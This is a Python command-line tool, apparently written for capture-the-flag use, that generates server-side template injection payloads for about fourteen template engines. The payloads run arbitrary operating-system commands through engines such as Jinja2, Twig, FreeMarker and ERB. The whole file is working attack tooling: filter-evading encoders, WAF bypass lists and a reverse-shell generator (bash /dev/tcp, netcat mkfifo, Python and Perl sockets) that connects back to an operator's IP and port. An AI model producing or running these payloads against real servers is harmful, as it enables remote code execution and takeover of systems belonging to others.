#!/usr/bin/env python3
import base64
import urllib.parse
import json
from typing import List, Dict


class AdvancedSSTIGenerator:
    def __init__(self):
        self.encoding_methods = {
            'hex': lambda s: ''.join([f'\\x{ord(c):02x}' for c in s]),
            'octal': lambda s: ''.join([f'\\{ord(c):03o}' for c in s]),
            'unicode': lambda s: ''.join([f'\\u{ord(c):04x}' for c in s]),
            'mixed': self.mixed_encode,
            'base64': lambda s: base64.b64encode(s.encode()).decode(),
            'url': lambda s: urllib.parse.quote(s),
            'double_url': lambda s: urllib.parse.quote(urllib.parse.quote(s)),
        }

        self.bypass_filters = {
            'underscore': ['\\x5f', '\\137', '\\u005f', '[request.args.x]', '{{request.args.u}}'],
            'dot': ['[', '|attr()', '["', "['"],
            'quotes': ['request.args', 'request.values', 'request.form'],
            'brackets': ['.__getitem__()', '|attr("__getitem__")'],
        }

    def mixed_encode(self, s):
        result = ''
        for i, c in enumerate(s):
            if i % 2 == 0:
                result += f'\\x{ord(c):02x}'
            else:
                result += f'\\{ord(c):03o}'
        return result

    def encode_string(self, text, method='hex'):
        encoder = self.encoding_methods.get(method, self.encoding_methods['hex'])
        return encoder(text)

    def escape_command(self, command):
        return command.replace("'", "\\'").replace('"', '\\"')

    def build_reverse_shell(self, ip, port):
        """Generate reverse shell payloads"""
        shells = {
            'bash': f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'nc': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            'perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        }
        return shells

    # ==================== JINJA2 ADVANCED PAYLOADS ====================

    def jinja2_url_for(self, command, encoding='hex'):
        cmd = self.escape_command(command)
        g = self.encode_string('__globals__', encoding)
        gi = self.encode_string('__getitem__', encoding)
        return f"{{{{url_for|attr('{g}')|attr('{gi}')('os')|attr('popen')('{cmd}')|attr('read')()}}}}"

    def jinja2_request(self, command, encoding='hex'):
        cmd = self.escape_command(command)
        g = self.encode_string('__globals__', encoding)
        gi = self.encode_string('__getitem__', encoding)
        return f"{{{{request|attr('{g}')|attr('{gi}')('os')|attr('popen')('{cmd}')|attr('read')()}}}}"

    def jinja2_config(self, command, encoding='hex'):
        cmd = self.escape_command(command)
        c = self.encode_string('__class__', encoding)
        i = self.encode_string('__init__', encoding)
        g = self.encode_string('__globals__', encoding)
        gi = self.encode_string('__getitem__', encoding)
        return f"{{{{config|attr('{c}')|attr('{i}')|attr('{g}')|attr('{gi}')('os')|attr('popen')('{cmd}')|attr('read')()}}}}"

    def jinja2_lipsum(self, command, encoding='hex'):
        cmd = self.escape_command(command)
        g = self.encode_string('__globals__', encoding)
        return f"{{{{lipsum|attr('{g}')['os'].popen('{cmd}').read()}}}}"

    def jinja2_cycler(self, command, encoding='hex'):
        cmd = self.escape_command(command)
        i = self.encode_string('__init__', encoding)
        g = self.encode_string('__globals__', encoding)
        return f"{{{{cycler|attr('{i}')|attr('{g}')['os'].popen('{cmd}').read()}}}}"

    def jinja2_joiner(self, command, encoding='hex'):
        cmd = self.escape_command(command)
        i = self.encode_string('__init__', encoding)
        g = self.encode_string('__globals__', encoding)
        return f"{{{{joiner|attr('{i}')|attr('{g}')['os'].popen('{cmd}').read()}}}}"

    def jinja2_namespace(self, command, encoding='hex'):
        cmd = self.escape_command(command)
        i = self.encode_string('__init__', encoding)
        g = self.encode_string('__globals__', encoding)
        return f"{{{{namespace|attr('{i}')|attr('{g}')['os'].popen('{cmd}').read()}}}}"

    def jinja2_subclasses_detailed(self, command, encoding='hex', index=None):
        """Generate subclass-based payload with different indices"""
        cmd = self.escape_command(command)
        c = self.encode_string('__class__', encoding)
        b = self.encode_string('__base__', encoding)
        s = self.encode_string('__subclasses__', encoding)
        i = self.encode_string('__init__', encoding)
        g = self.encode_string('__globals__', encoding)

        if index:
            return f"{{{{''|attr('{c}')|attr('{b}')|attr('{s}')()|attr('__getitem__')({index})|attr('{i}')|attr('{g}')['os'].popen('{cmd}').read()}}}}"

        # Return multiple with common indices
        indices = [40, 59, 64, 79, 80, 132, 166, 296, 414]
        payloads = []
        for idx in indices:
            payloads.append(
                f"{{{{''|attr('{c}')|attr('{b}')|attr('{s}')()|attr('__getitem__')({idx})|attr('{i}')|attr('{g}')['os'].popen('{cmd}').read()}}}}")
        return payloads

    def jinja2_import_bypass(self, command, encoding='hex'):
        """Import os directly using __import__"""
        cmd = self.escape_command(command)
        g = self.encode_string('__globals__', encoding)
        b = self.encode_string('__builtins__', encoding)
        i = self.encode_string('__import__', encoding)
        return f"{{{{request|attr('{g}')|attr('{b}')|attr('{i}')('os').popen('{cmd}').read()}}}}"

    def jinja2_eval_bypass(self, command):
        """Use eval for command execution"""
        cmd = self.escape_command(command)
        payload = f"__import__('os').popen('{cmd}').read()"
        return f"{{{{% for c in [].__class__.__base__.__subclasses__() %}}{{{{% if c.__name__ == 'catch_warnings' %}}{{{{c()._module.__builtins__['__import__']('os').popen('{cmd}').read()}}}}{{{{% endif %}}}}{{{{% endfor %}}}}"

    def jinja2_filter_bypass(self, command):
        """Bypass using custom filters"""
        cmd = self.escape_command(command)
        return f"{{{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('{cmd}')['read']()}}}}"

    def jinja2_attr_chain(self, command, encoding='hex'):
        """Long attribute chain bypass"""
        cmd = self.escape_command(command)
        return f"{{{{request|attr(request.args.a)|attr(request.args.b)(request.args.c)|attr(request.args.d)(request.args.e)|attr(request.args.f)()}}}}&a=__class__&b=__init__&c=__globals__&d=__getitem__&e=os&f=popen&g={cmd}"

    # ==================== TWIG PAYLOADS ====================

    def twig_system(self, command):
        cmd = self.escape_command(command)
        return f"{{{{_self.env.registerUndefinedFilterCallback('system')}}}}{{{{_self.env.getFilter('{cmd}')}}}}"

    def twig_exec(self, command):
        cmd = self.escape_command(command)
        return f"{{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('{cmd}')}}}}"

    def twig_passthru(self, command):
        cmd = self.escape_command(command)
        return f"{{{{_self.env.registerUndefinedFilterCallback('passthru')}}}}{{{{_self.env.getFilter('{cmd}')}}}}"

    def twig_shell_exec(self, command):
        cmd = self.escape_command(command)
        return f"{{{{_self.env.registerUndefinedFilterCallback('shell_exec')}}}}{{{{_self.env.getFilter('{cmd}')}}}}"

    def twig_assert(self, command):
        cmd = self.escape_command(command)
        return f"{{{{_self.env.registerUndefinedFilterCallback('assert')}}}}{{{{_self.env.getFilter('system(\"{cmd}\")')}}}}"

    # ==================== TORNADO PAYLOADS ====================

    def tornado_import(self, command):
        cmd = self.escape_command(command)
        return f"{{% import os %}}{{{{os.popen('{cmd}').read()}}}}"

    def tornado_module(self, command):
        cmd = self.escape_command(command)
        return f"{{% import subprocess %}}{{{{subprocess.check_output('{cmd}', shell=True)}}}}"

    # ==================== FREEMARKER PAYLOADS ====================

    def freemarker_exec(self, command):
        cmd = self.escape_command(command)
        return f"<#assign ex='freemarker.template.utility.Execute'?new()>${{ex('{cmd}')}}"

    def freemarker_objectconstructor(self, command):
        cmd = self.escape_command(command)
        return f"${{\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",[\"{cmd}\"]).start()}}"

    # ==================== SMARTY PAYLOADS ====================

    def smarty_system(self, command):
        cmd = self.escape_command(command)
        return f"{{system('{cmd}')}}"

    def smarty_php(self, command):
        cmd = self.escape_command(command)
        return f"{{php}}system('{cmd}');{{/php}}"

    def smarty_passthru(self, command):
        cmd = self.escape_command(command)
        return f"{{php}}passthru('{cmd}');{{/php}}"

    def smarty_exec(self, command):
        cmd = self.escape_command(command)
        return f"{{php}}exec('{cmd}', $output); echo implode(\"\\n\", $output);{{/php}}"

    # ==================== MAKO PAYLOADS ====================

    def mako_import(self, command):
        cmd = self.escape_command(command)
        return f"<%import os%>${{os.popen('{cmd}').read()}}"

    def mako_subprocess(self, command):
        cmd = self.escape_command(command)
        return f"<%import subprocess%>${{subprocess.check_output('{cmd}', shell=True)}}"

    # ==================== VELOCITY PAYLOADS ====================

    def velocity_runtime(self, command):
        cmd = self.escape_command(command)
        return f"#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('{cmd}'))#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"

    def velocity_processbuilder(self, command):
        cmd = self.escape_command(command)
        return f"#set($x='')#set($pb=$x.class.forName('java.lang.ProcessBuilder'))#set($arr=$x.class.forName('java.util.ArrayList'))#set($cmd=$arr.newInstance())#set($void=$cmd.add('{cmd}'))#set($proc=$pb.newInstance($cmd).start())"

    # ==================== THYMELEAF PAYLOADS ====================

    def thymeleaf_runtime(self, command):
        cmd = self.escape_command(command)
        return f"${{T(java.lang.Runtime).getRuntime().exec('{cmd}')}}"

    def thymeleaf_processbuilder(self, command):
        cmd = self.escape_command(command)
        return f"${{T(java.lang.ProcessBuilder).ProcessBuilder('{cmd}').start()}}"

    # ==================== PEBBLE PAYLOADS ====================

    def pebble_runtime(self, command):
        cmd = self.escape_command(command)
        return f"{{{{variable.getClass().forName('java.lang.Runtime').getRuntime().exec('{cmd}')}}}}"

    # ==================== ERB (Ruby) PAYLOADS ====================

    def erb_system(self, command):
        cmd = self.escape_command(command)
        return f"<%= system('{cmd}') %>"

    def erb_exec(self, command):
        cmd = self.escape_command(command)
        return f"<%= exec('{cmd}') %>"

    def erb_backticks(self, command):
        cmd = self.escape_command(command)
        return f"<%= `{cmd}` %>"

    def erb_popen(self, command):
        cmd = self.escape_command(command)
        return f"<%= IO.popen('{cmd}').read() %>"

    # ==================== JADE/PUG PAYLOADS ====================

    def jade_code(self, command):
        cmd = self.escape_command(command)
        return f"- var x = require('child_process').execSync('{cmd}').toString()\n= x"

    # ==================== HANDLEBARS PAYLOADS ====================

    def handlebars_lookup(self, command):
        cmd = self.escape_command(command)
        return f"{{{{#with \"s\" as |string|}}}}{{{{#with \"e\"}}}}{{{{#with split as |conslist|}}}}{{{{this.pop}}}}{{{{this.push (lookup string.sub \"constructor\")}}}}{{{{this.pop}}}}{{{{#with string.split as |codelist|}}}}{{{{this.pop}}}}{{{{this.push \"return require('child_process').exec('{cmd}');\"}}}}{{{{this.pop}}}}{{{{#each conslist}}}}{{{{#with (string.sub.apply 0 codelist)}}}}{{{{this}}}}{{{{/with}}}}{{{{/each}}}}{{{{/with}}}}{{{{/with}}}}{{{{/with}}}}{{{{/with}}}}"

    # ==================== DUST.JS PAYLOADS ====================

    def dustjs_exec(self, command):
        cmd = self.escape_command(command)
        return f"{{{{#require}}}}child_process{{{{/require}}}}{{{{#exec}}}}'{cmd}'{{{{/exec}}}}"

    # ==================== LESSJS PAYLOADS ====================

    def lessjs_exec(self, command):
        cmd = self.escape_command(command)
        return f"`{cmd}`"


def print_banner():
    banner = """
    ╔════════════════════════════════════════════════════════════════╗
    ║    🔥 ULTIMATE SSTI PAYLOAD GENERATOR v3.0 ULTRA 🔥          ║
    ║         Advanced Multi-Engine CTF Exploitation Tool            ║
    ║              15+ Template Engines | 100+ Payloads              ║
    ╚════════════════════════════════════════════════════════════════╝
    """
    print(banner)


def print_menu():
    menu = """
    ╔═══════════════ TEMPLATE ENGINES ═══════════════╗
    ║  1.  Jinja2/Flask (12+ Methods) ⭐             ║
    ║  2.  Twig (PHP/Symfony) - 5 Methods            ║
    ║  3.  Tornado (Python) - 2 Methods              ║
    ║  4.  FreeMarker (Java) - 2 Methods             ║
    ║  5.  Smarty (PHP) - 4 Methods                  ║
    ║  6.  Mako (Python) - 2 Methods                 ║
    ║  7.  Velocity (Java) - 2 Methods               ║
    ║  8.  Thymeleaf (Java) - 2 Methods              ║
    ║  9.  Pebble (Java)                             ║
    ║  10. ERB (Ruby) - 4 Methods                    ║
    ║  11. Jade/Pug (Node.js)                        ║
    ║  12. Handlebars (Node.js)                      ║
    ║  13. Dust.js (Node.js)                         ║
    ║  14. Less.js (Node.js)                         ║
    ╠═══════════════ SPECIAL FEATURES ═══════════════╣
    ║  15. 🚀 Reverse Shell Generator                ║
    ║  16. 💣 Multi-Command Chain Mode               ║
    ║  17. 🔐 Encoding Method Switcher               ║
    ║  18. 🎯 Automated Fuzzing Payloads             ║
    ║  19. 📝 WAF Bypass Techniques                  ║
    ║  20. 💾 Export All Payloads (JSON/TXT)         ║
    ╠═══════════════════════════════════════════════╣
    ║  0.  Exit                                      ║
    ╚═══════════════════════════════════════════════╝
    """
    print(menu)


def execute_multiple_commands(commands):
    """Chain multiple Linux commands intelligently"""
    if len(commands) == 1:
        return commands[0]
    # Use && for sequential execution
    return ' && '.join(commands)


def generate_fuzzing_payloads(base_payload):
    """Generate variations for WAF bypass"""
    variations = []

    # Space variations
    variations.append(base_payload.replace(' ', '${IFS}'))
    variations.append(base_payload.replace(' ', '$IFS$9'))
    variations.append(base_payload.replace(' ', '{IFS}'))

    # Quote variations
    variations.append(base_payload.replace("'", '"'))
    variations.append(base_payload.replace("'", ''))

    # Case variations
    variations.append(base_payload.upper())
    variations.append(base_payload.lower())

    # Concat variations
    if 'cat' in base_payload:
        variations.append(base_payload.replace('cat', 'c""at'))
        variations.append(base_payload.replace('cat', "c''at"))
        variations.append(base_payload.replace('cat', 'ca\\t'))

    return variations


def generate_waf_bypass_techniques():
    """Generate common WAF bypass techniques"""
    bypasses = {
        'Space Bypass': ['${IFS}', '$IFS$9', '{IFS}', '$IFS', '<', '<>', '%20', '%09'],
        'Command Bypass': ['c""at', "c''at", 'ca\\t', '/bin/cat', '$(which cat)', '`which cat`'],
        'Slash Bypass': ['${HOME:0:1}', '$HOME$u', '${PATH:0:1}', '${PATH::1}'],
        'Wildcard Bypass': ['/???/cat', '/???/n?', '/bin/b?sh'],
        'Newline Bypass': ['%0a', '\\n', '\\r', '\\r\\n'],
        'Concatenation': ["'c'a't'", '"c"a"t"', 'c\\a\\t'],
        'Variable Expansion': ['$0', '${0}', '$@', '${@}'],
    }
    return bypasses


def export_payloads(payloads, filename='payloads', format_type='txt'):
    """Export generated payloads to file"""
    if format_type == 'json':
        with open(f'{filename}.json', 'w') as f:
            json.dump(payloads, f, indent=2)
        print(f"\n[✓] Payloads exported to {filename}.json")
    else:
        with open(f'{filename}.txt', 'w') as f:
            for engine, payload_list in payloads.items():
                f.write(f"{'=' * 60}\n")
                f.write(f"{engine}\n")
                f.write(f"{'=' * 60}\n")
                if isinstance(payload_list, list):
                    for p in payload_list:
                        f.write(f"{p}\n\n")
                else:
                    f.write(f"{payload_list}\n\n")
        print(f"\n[✓] Payloads exported to {filename}.txt")


def main():
    generator = AdvancedSSTIGenerator()
    current_encoding = 'hex'
    generated_payloads = {}

    print_banner()

    while True:
        print_menu()
        choice = input("\n[>] Select option: ").strip()

        if choice == '0':
            print("\n[!] Exiting... Happy Hacking! 🚀\n")
            break

        # Encoding switcher
        if choice == '17':
            print("\n╔═══════════════ ENCODING METHODS ═══════════════╗")
            print("║  1. Hex (\\x5f) - Most Common                  ║")
            print("║  2. Octal (\\137)                              ║")
            print("║  3. Unicode (\\u005f)                          ║")
            print("║  4. Mixed (Hex + Octal)                       ║")
            print("║  5. Base64                                    ║")
            print("║  6. URL Encoding                              ║")
            print("║  7. Double URL Encoding                       ║")
            print("╚═══════════════════════════════════════════════╝")
            enc_choice = input("\n[>] Select encoding: ").strip()
            encoding_map = {'1': 'hex', '2': 'octal', '3': 'unicode', '4': 'mixed',
                            '5': 'base64', '6': 'url', '7': 'double_url'}
            current_encoding = encoding_map.get(enc_choice, 'hex')
            print(f"\n[✓] Encoding method set to: {current_encoding.upper()}")
            continue

        # Reverse shell generator
        if choice == '15':
            print("\n╔═══════════════ REVERSE SHELL GENERATOR ═══════════════╗")
            ip = input("[>] Enter your IP address: ").strip()
            port = input("[>] Enter your port: ").strip()

            if not ip or not port:
                print("\n[!] IP and Port required!")
                continue

            shells = generator.build_reverse_shell(ip, port)
            print(f"\n{'=' * 70}")
            print("[REVERSE SHELL PAYLOADS]")
            print(f"{'=' * 70}\n")

            for shell_type, payload in shells.items():
                print(f"[{shell_type.upper()}]")
                print(payload)
                print()

            print(f"{'=' * 70}\n")
            print("[TIP] Use these payloads in any SSTI engine with command execution!")
            print("[TIP] Start listener: nc -lvnp " + port)
            input("\n[Press ENTER to continue]")
            continue

        # WAF Bypass Techniques
        if choice == '19':
            print("\n╔═══════════════ WAF BYPASS TECHNIQUES ═══════════════╗")
            bypasses = generate_waf_bypass_techniques()
            for technique, methods in bypasses.items():
                print(f"\n[{technique}]")
                for method in methods:
                    print(f"  • {method}")
            print("\n╚═════════════════════════════════════════════════════╝")
            input("\n[Press ENTER to continue]")
            continue

        # Export payloads
        if choice == '20':
            if not generated_payloads:
                print("\n[!] No payloads generated yet!")
                continue

            print("\n[EXPORT FORMAT]")
            print("1. TXT")
            print("2. JSON")
            exp_choice = input("[>] Select format: ").strip()
            filename = input("[>] Enter filename (default: payloads): ").strip() or 'payloads'

            format_type = 'json' if exp_choice == '2' else 'txt'
            export_payloads(generated_payloads, filename, format_type)
            input("\n[Press ENTER to continue]")
            continue

        # Automated Fuzzing Payloads
        if choice == '18':
            print("\n[?] Enter base command for fuzzing:")
            cmd = input("[>] Command: ").strip()
            if not cmd:
                print("\n[!] No command entered!")
                continue

            print(f"\n{'=' * 70}")
            print("[FUZZING VARIATIONS]")
            print(f"{'=' * 70}\n")

            base = generator.jinja2_request(cmd, current_encoding)
            variations = generate_fuzzing_payloads(cmd)

            print(f"[BASE PAYLOAD]\n{base}\n")
            print("[VARIATIONS]")
            for i, var in enumerate(variations, 1):
                payload = generator.jinja2_request(var, current_encoding)
                print(f"{i}. {payload}\n")

            print(f"{'=' * 70}\n")
            input("[Press ENTER to continue]")
            continue

        # Get command(s)
        if choice not in ['15', '17', '18', '19', '20']:
            print("\n[?] Enter command(s):")
            print("    • Single: ls -la")
            print("    • Multiple: ls;cat flag.txt;whoami")
            print("    • File ops: find / -name flag.txt 2>/dev/null")
            cmd_input = input("\n[>] Command: ").strip()

            if not cmd_input:
                print("\n[!] No command entered!")
                continue

            commands = [c.strip() for c in cmd_input.split(';') if c.strip()]
            final_command = execute_multiple_commands(commands)

            print(f"\n{'=' * 70}")
            print(f"[COMMAND] {final_command}")
            print(f"[ENCODING] {current_encoding.upper()}")
            print(f"{'=' * 70}\n")

        # Generate payloads
        engine_name = ""
        payloads = []

        if choice == '1':
            engine_name = "Jinja2/Flask"
            print("[JINJA2/FLASK PAYLOADS - 12 METHODS]\n")

            methods = [
                ("1. url_for", generator.jinja2_url_for(final_command, current_encoding)),
                ("2. request", generator.jinja2_request(final_command, current_encoding)),
                ("3. config", generator.jinja2_config(final_command, current_encoding)),
                ("4. lipsum", generator.jinja2_lipsum(final_command, current_encoding)),
                ("5. cycler", generator.jinja2_cycler(final_command, current_encoding)),
                ("6. joiner", generator.jinja2_joiner(final_command, current_encoding)),
                ("7. namespace", generator.jinja2_namespace(final_command, current_encoding)),
                ("8. import bypass", generator.jinja2_import_bypass(final_command, current_encoding)),
                ("9. filter bypass", generator.jinja2_filter_bypass(final_command)),
                ("10. attr chain", generator.jinja2_attr_chain(final_command, current_encoding)),
            ]

            for name, payload in methods:
                print(f"{name}:")
                print(payload)
                print()
                payloads.append(payload)

            print("11. subclasses (multiple indices):")
            subclass_payloads = generator.jinja2_subclasses_detailed(final_command, current_encoding)
            for idx, sp in enumerate(subclass_payloads[:3], 1):
                print(f"  {idx}. {sp}")
            payloads.extend(subclass_payloads)

            print("\n12. eval bypass:")
            eval_payload = generator.jinja2_eval_bypass(final_command)
            print(eval_payload)
            payloads.append(eval_payload)

        elif choice == '2':
            engine_name = "Twig/Symfony"
            print("[TWIG/SYMFONY PAYLOADS - 5 METHODS]\n")

            methods = [
                ("1. system", generator.twig_system(final_command)),
                ("2. exec", generator.twig_exec(final_command)),
                ("3. passthru", generator.twig_passthru(final_command)),
                ("4. shell_exec", generator.twig_shell_exec(final_command)),
                ("5. assert", generator.twig_assert(final_command)),
            ]

            for name, payload in methods:
                print(f"{name}:")
                print(payload)
                print()
                payloads.append(payload)

        elif choice == '3':
            engine_name = "Tornado"
            print("[TORNADO PAYLOADS - 2 METHODS]\n")

            methods = [
                ("1. import os", generator.tornado_import(final_command)),
                ("2. subprocess", generator.tornado_module(final_command)),
            ]

            for name, payload in methods:
                print(f"{name}:")
                print(payload)
                print()
                payloads.append(payload)

        elif choice == '4':
            engine_name = "FreeMarker"
            print("[FREEMARKER PAYLOADS - 2 METHODS]\n")

            methods = [
                ("1. Execute", generator.freemarker_exec(final_command)),
                ("2. ObjectConstructor", generator.freemarker_objectconstructor(final_command)),
            ]

            for name, payload in methods:
                print(f"{name}:")
                print(payload)
                print()
                payloads.append(payload)

        elif choice == '5':
            engine_name = "Smarty"
            print("[SMARTY PAYLOADS - 4 METHODS]\n")

            methods = [
                ("1. system", generator.smarty_system(final_command)),
                ("2. php block", generator.smarty_php(final_command)),
                ("3. passthru", generator.smarty_passthru(final_command)),
                ("4. exec", generator.smarty_exec(final_command)),
            ]

            for name, payload in methods:
                print(f"{name}:")
                print(payload)
                print()
                payloads.append(payload)

        elif choice == '6':
            engine_name = "Mako"
            print("[MAKO PAYLOADS - 2 METHODS]\n")

            methods = [
                ("1. import os", generator.mako_import(final_command)),
                ("2. subprocess", generator.mako_subprocess(final_command)),
            ]

            for name, payload in methods:
                print(f"{name}:")
                print(payload)
                print()
                payloads.append(payload)

        elif choice == '7':
            engine_name = "Velocity"
            print("[VELOCITY PAYLOADS - 2 METHODS]\n")

            methods = [
                ("1. Runtime", generator.velocity_runtime(final_command)),
                ("2. ProcessBuilder", generator.velocity_processbuilder(final_command)),
            ]

            for name, payload in methods:
                print(f"{name}:")
                print(payload)
                print()
                payloads.append(payload)

        elif choice == '8':
            engine_name = "Thymeleaf"
            print("[THYMELEAF PAYLOADS - 2 METHODS]\n")

            methods = [
                ("1. Runtime", generator.thymeleaf_runtime(final_command)),
                ("2. ProcessBuilder", generator.thymeleaf_processbuilder(final_command)),
            ]

            for name, payload in methods:
                print(f"{name}:")
                print(payload)
                print()
                payloads.append(payload)

        elif choice == '9':
            engine_name = "Pebble"
            print("[PEBBLE PAYLOADS]\n")

            payload = generator.pebble_runtime(final_command)
            print(f"Runtime exec:\n{payload}\n")
            payloads.append(payload)

        elif choice == '10':
            engine_name = "ERB (Ruby)"
            print("[ERB PAYLOADS - 4 METHODS]\n")

            methods = [
                ("1. system", generator.erb_system(final_command)),
                ("2. exec", generator.erb_exec(final_command)),
                ("3. backticks", generator.erb_backticks(final_command)),
                ("4. IO.popen", generator.erb_popen(final_command)),
            ]

            for name, payload in methods:
                print(f"{name}:")
                print(payload)
                print()
                payloads.append(payload)

        elif choice == '11':
            engine_name = "Jade/Pug"
            print("[JADE/PUG PAYLOADS]\n")

            payload = generator.jade_code(final_command)
            print(f"execSync:\n{payload}\n")
            payloads.append(payload)

        elif choice == '12':
            engine_name = "Handlebars"
            print("[HANDLEBARS PAYLOADS]\n")

            payload = generator.handlebars_lookup(final_command)
            print(f"Lookup chain:\n{payload}\n")
            payloads.append(payload)

        elif choice == '13':
            engine_name = "Dust.js"
            print("[DUST.JS PAYLOADS]\n")

            payload = generator.dustjs_exec(final_command)
            print(f"exec:\n{payload}\n")
            payloads.append(payload)

        elif choice == '14':
            engine_name = "Less.js"
            print("[LESS.JS PAYLOADS]\n")

            payload = generator.lessjs_exec(final_command)
            print(f"Backticks:\n{payload}\n")
            payloads.append(payload)

        elif choice == '16':
            engine_name = "Multi-Command Chain"
            print("\n╔═══════════════ MULTI-COMMAND CHAIN MODE ═══════════════╗")
            print("Enter commands one by one (type 'done' when finished):")
            custom_commands = []
            while True:
                cmd = input(f"  Command #{len(custom_commands) + 1}: ").strip()
                if cmd.lower() == 'done':
                    break
                if cmd:
                    custom_commands.append(cmd)

            if custom_commands:
                chained = execute_multiple_commands(custom_commands)
                print(f"\n{'=' * 70}")
                print(f"[CHAINED COMMAND] {chained}")
                print(f"{'=' * 70}\n")

                print("[JINJA2 PAYLOADS FOR CHAIN]\n")
                methods = [
                    ("url_for", generator.jinja2_url_for(chained, current_encoding)),
                    ("request", generator.jinja2_request(chained, current_encoding)),
                    ("config", generator.jinja2_config(chained, current_encoding)),
                ]

                for name, payload in methods:
                    print(f"{name}:")
                    print(payload)
                    print()
                    payloads.append(payload)

        else:
            print("\n[!] Invalid option!")
            continue

        # Store generated payloads
        if engine_name and payloads:
            generated_payloads[engine_name] = payloads

        if choice not in ['15', '16', '17', '18', '19', '20']:
            print(f"{'=' * 70}")
            print(f"\n[✓] Generated {len(payloads)} payload(s) for {engine_name}")
            print("\n[💡 TIPS]")
            print("  • Try all payloads - different methods work on different servers")
            print("  • Use option 18 for automated fuzzing variations")
            print("  • Use option 19 to see WAF bypass techniques")
            print("  • Use option 20 to export all payloads")
            print(f"\n{'=' * 70}\n")

        input("[Press ENTER to continue]")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user. Exiting...\n")
    except Exception as e:
        print(f"\n[!] Error: {e}\n")